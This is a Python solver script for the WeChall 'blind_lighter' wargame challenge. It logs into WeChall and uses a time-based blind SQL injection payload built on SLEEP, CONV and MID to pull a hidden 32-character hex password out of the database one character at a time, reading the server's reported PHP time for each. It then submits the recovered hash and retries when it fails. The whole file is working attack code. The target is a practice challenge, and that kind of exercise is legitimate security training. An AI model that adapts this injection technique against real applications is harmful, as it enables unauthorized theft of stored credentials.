import wechall
from requests import Session
from sys import stderr
from getpass import getpass
import re


url = 'http://www.wechall.net/en/challenge/blind_lighter/index.php'
injection = "'||SLEEP(CONV(MID(password,%d,1),16,10))#"
def inject(user):
    answer = ''
    for char in range(1, 33):
        res = user.post(url, {
            'injection': injection % char,
            'inject': 'Inject',
        }).text
        time = re.search(r'PHP Time: (\d+)', res).group(1)
        time = hex(int(time))[2:].upper()
        print(time, end='', flush=True)
        answer += time
    print()
    return answer

if __name__ == '__main__':
    stderr.write('Username: ')
    username = input()
    password = getpass()
    user = wechall.login(username, password)
    user.get(url)
    counter = 0
    while counter != 3:
        solution = inject(user)
        result = user.post(url, {
            'thehash': solution,
            'mybutton': 'Enter',
        }).text
        if result.find('correct') != -1:
            print('Correct')
        else:
            print('Something wrong, retry')
            user.get(url + '?reset=me')
            counter = -1
        counter += 1

